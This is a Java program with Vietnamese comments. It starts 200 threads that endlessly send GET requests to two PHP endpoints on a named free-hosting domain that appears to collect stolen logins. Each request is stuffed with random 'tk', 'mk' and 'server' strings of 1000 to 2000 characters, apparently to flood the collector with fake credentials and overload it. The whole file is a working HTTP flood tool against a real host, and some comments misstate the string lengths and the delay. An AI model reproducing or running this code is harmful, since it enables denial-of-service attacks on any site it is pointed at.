import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.SecureRandom;

public class Http implements Runnable {
    private static final String CHARACTERS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    private static final String[] URLS = {
            "https://taothichkeylog.000webhostapp.com/dat009vip.php",
            "https://taothichkeylog.000webhostapp.com/dat009vip.php",
            "https://taothichkeylog.000webhostapp.com/dat009vip.php",
            "https://taothichkeylog.000webhostapp.com/dat009vip.php",
            "https://taothichkeylog.000webhostapp.com/dat009vip.php",
            "https://taothichkeylog.000webhostapp.com/dat009vip.php",
            "https://taothichkeylog.000webhostapp.com/dat009vip.php",
            "https://taothichkeylog.000webhostapp.com/dat009vip.php",
            "https://taothichkeylog.000webhostapp.com/dat009vip.php",
            "https://taothichkeylog.000webhostapp.com/dat009vip.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            "https://taothichkeylog.000webhostapp.com/datvippro.php",
            // Thêm các đường link khác vào đây
    };

    private static int sentCount = 0;

    public static synchronized void incrementSentCount() {
        sentCount++;
    }

    public static void sendHttpRequest(String urlStr) throws IOException {
        URL url = new URL(urlStr);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");
        connection.setDoOutput(true);
        connection.connect();

        int responseCode = connection.getResponseCode();
        incrementSentCount();
        System.out.println("Status: " + responseCode + " Số lần gửi đi: " + sentCount);

        connection.disconnect();
    }

    public static String generateRandomString(int length) {
        SecureRandom random = new SecureRandom();
        StringBuilder sb = new StringBuilder(length);

        for (int i = 0; i < length; i++) {
            int randomIndex = random.nextInt(CHARACTERS.length());
            char randomChar = CHARACTERS.charAt(randomIndex);
            sb.append(randomChar);
        }

        return sb.toString();
    }

    public void run() {
        while (true) {
            for (String url : URLS) {
                StringBuilder stringBuilder = new StringBuilder();
                stringBuilder.append(url);
                stringBuilder.append("?tk=");
                stringBuilder.append(generateRandomString(1000)); // Sinh chuỗi ngẫu nhiên có 20 ký tự cho phần "tk"
                stringBuilder.append("&mk=");
                stringBuilder.append(generateRandomString(1000)); // Sinh chuỗi ngẫu nhiên có 20 ký tự cho phần "mk"
                stringBuilder.append("&server=");
                stringBuilder.append(generateRandomString(2000)); // Sinh chuỗi ngẫu nhiên có 20 ký tự cho phần "sv"
                try {
                    sendHttpRequest(stringBuilder.toString());
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

            try {
                Thread.sleep(1); // Đợi 1 giây trước khi gửi yêu cầu tới các đường link khác
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    public static void main(String[] args) {
        Http fileHTTP = new Http();
        int threadCount = 200;

        for (int i = 0; i < threadCount; i++) {
            Thread thread = new Thread(fileHTTP);
            thread.start();
        }
    }
}
